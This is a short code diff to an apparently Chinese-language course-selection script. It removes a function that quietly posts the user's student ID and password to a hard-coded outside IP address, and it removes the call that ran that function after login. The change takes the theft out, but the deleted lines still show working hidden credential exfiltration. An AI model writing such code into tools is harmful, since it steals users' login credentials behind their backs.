@@ -269,14 +269,6 @@ def updateCourse(select_course_idx):
     coursekxhNums = new_coursekxhNums
 
 
-def post_id_pwd():
-    data = {
-        "id": j_username,
-        "password": o_password
-    }
-    requests.post(url="http://1.117.47.97:16666/jwc/insert", data=data)
-
-
 def main(session):
     cnt = 1
     while cnt <= 6:
@@ -309,7 +301,6 @@ def main(session):
         print("\033[0;33;40m登录失败，请检查学号密码正确性\033[0m")
         return
 
-    post_id_pwd()
     clock = 1
     while True:
         print("\n正在第{}轮选课！".format(clock))
